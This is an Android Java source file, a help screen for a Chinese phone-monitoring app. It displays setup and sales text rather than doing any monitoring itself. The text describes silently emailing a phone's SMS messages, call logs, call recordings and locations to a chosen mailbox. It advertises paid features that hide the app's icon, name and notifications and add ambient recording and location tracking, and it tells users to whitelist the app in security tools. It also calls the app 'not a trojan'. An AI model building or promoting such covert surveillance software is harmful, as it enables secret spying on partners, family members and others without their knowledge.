package com.shiliukeji.xc_lsy.androidkillerservice;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.text.Html;
import android.widget.TextView;

public class HelpActivity extends AppCompatActivity {

    private TextView smNeirongTextView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_help);
        this.smNeirongTextView = (TextView) findViewById(R.id.tv_smneirong);
        String neirongHtml = "<p><font color=#FF0000>特别申明：软件为正规专业软件，非盗号钓鱼之病毒木马，请放心设置使用。</font><br/><br/>一、软件用途。软件适合工作和业务繁忙的文秘人员，商务人员、客户接洽人员等，用于自动备份您繁忙时的短信记录，通话记录，通话录音，通话位置等到自己的邮箱，等有空闲时再慢慢整理重要通话内容、业务往来短信内容、重要客户联系电话等，以免因电话多、业务多而遗漏。以及用于丢失手机定位找回、孩子电话行为监控、老人迷失或失踪位置跟踪等，<font color=#FF0000>禁止用于其他任何非法用途。</font><br/><br/>二、如何设置。接收邮箱用于接收电话、短信等邮件，格式如XXX@139.com,推荐使用139邮箱(有免费新邮件达到短信通知功能)，邮件可在\"收件箱\"和\"已发送\"中查找。<font color=#FF0000>注意：视设置邮箱的不同，可能需手动开启邮箱的SMTP服务</font>(经测试,126/163/yeah/sohu/139等邮箱已默认开启该服务)，以QQ邮箱为例,电脑操作步骤为:进入邮箱-顶部设置-账户-开启服务-勾选POP3/SMTP服务、IMAP/SMTP服务-保存设置。邮箱密码仅用于软件工作时登录你的邮箱，发送邮件。手机号码用于接收位置短信。功能设置和发送方式可任意勾选或全选。<br/><br/>三、使用步骤。设置好接收邮箱和邮箱密码，勾选必要功能及发送方式，开启你邮箱的SMTP服务，点击保存，稍后,你设置的邮箱将收到测试邮件。如果多次保存均未提示成功，请更换为我们推荐的139邮箱。<font color=#FF0000>注意：根据发送方式的不同，软件发送邮件可能需要数据流量。</font><br/><br/>四、注册正版。请参照注册流程，联系正版注册授权<font color=#ff0000>QQ：" + getString(R.string.zhuceqq) + "</font>,注册后可隐藏程序图标、隐藏程序文字名称、隐藏状态栏温馨提示，并具备手机位置主动跟踪、环境录音、换卡自动通知等功能(具体详询)。" + "如果你喜欢，请点击淘宝页面购买注册码：<a target=_bank href=>" + getString(R.string.zhucetaobaolink) + "</a><br/><br/>" + "五、常见问题。有些手机上安装了手机管家，360、乐安全等工具软件，可能引起通话录音或短信备份失败，需要在工具软件中将本软件设置为信任软件，允许软件所有操作，或加入白名单中。<br/><br/>" + "六、申请代理。</b>请联系正版代理授权<font color=#ff0000>QQ:1530732769</font>，可定制专属于你的代理版(不需代理费用)，可寻找你的潜在客户，并拥有你自己的软件售卖地址链接(淘宝或其他店铺)</p>" + "软件总售后QQ:1530732769" + "<br/>总售后邮箱:1530732769@qq.com 敬请咨询。<br/>二维码扫描下载地址：<a target=_bank href=>" + "http://www.malasi.cn/home.htm";
        this.smNeirongTextView.setAutoLinkMask(1);
        this.smNeirongTextView.setText(Html.fromHtml(neirongHtml));

    }
}
